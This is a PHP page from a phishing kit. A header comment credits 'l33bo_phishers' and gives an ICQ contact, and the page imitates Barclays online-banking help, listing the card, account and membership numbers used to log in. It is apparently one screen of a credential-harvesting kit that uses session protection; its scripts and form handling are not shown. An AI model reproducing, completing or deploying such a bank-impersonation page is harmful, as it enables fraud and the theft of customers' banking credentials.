<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "../includes/session_protect.php";
?>
﻿<!DOCTYPE html>
<html lang="en-GB">
<head>
<link rel="stylesheet" type="text/css" href="css/001.css" media="screen" />
<script type="text/javascript" src="js/001.js"></script>
<script type="text/javascript" src="js/002.js"></script>
<script type="text/javascript" src="js/003.js"></script>
</head>
<body class='personal ContextualHelp'>
<div class="header">
<div class="">
</div>
<div class="separator">
<hr />
</div>
</div>
<div class="page">
<div class="body">
<div class="content">
<div class="section">
<div id='box1' class='mod cont-sm borderless'>
<div class="rt">
<div class="lt">
<div class="m-cont">
<p>Your membership details<br />
<br />
You can log in with any of the following:</p>
<ul>
<li>12-digit membership number</li>
<li>Barclays debit card, cash card or authentication card number</li>
<li>Sort code &amp; account number <br />
&nbsp;</li>
</ul>
<p>Your membership number usually starts '2010' or '2020'. If you've forgotten it, you can retrieve it by filling out the form below.</p>
<p>If you aren't using your membership number to log in, we may need to ask you additional questions to verify your identity.</p></div>
</div>
</div>
<div class="rb"></div>
</div>
</div>
</div>
<div class="main-footer"></div>
</div>
</body>
</html>
